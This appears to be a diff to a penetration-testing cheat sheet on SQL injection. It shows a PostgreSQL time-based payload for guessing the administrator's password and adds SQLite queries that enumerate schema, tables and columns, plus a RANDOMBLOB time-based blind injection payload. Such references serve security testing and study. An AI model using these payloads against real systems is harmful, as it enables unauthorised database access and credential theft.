@@ -199,7 +199,21 @@ The below can be used to identify if the 'administrator' username exists within 
 
 The below LIKE statement allows for the identification of passwords associated with the administrator username. The %25 is the encoded value for %, which acts as a wildcard within that statement. Using 'a%' checks whether the value begins with the letter 'a'.
 `%3BSELECT+CASE+WHEN+(password LIKE '%25')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users WHERE username='administrator'--`
+# SQLite
+Show the database version
+`select sqlite_version();`
 
+Show available databases
+`SELECT sql FROM sqlite_master;`
+
+Show the tables name
+`SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'`
+
+Show the columns in the table
+`SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='INSERT-TABLE-NAME-HERE'`
+
+Time-based injection query
+`AND [RANDNUM]=LIKE('STRING-HERE',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))`
 # SQLMAP
 
 To throw the kitchen sink at an injection point, use:
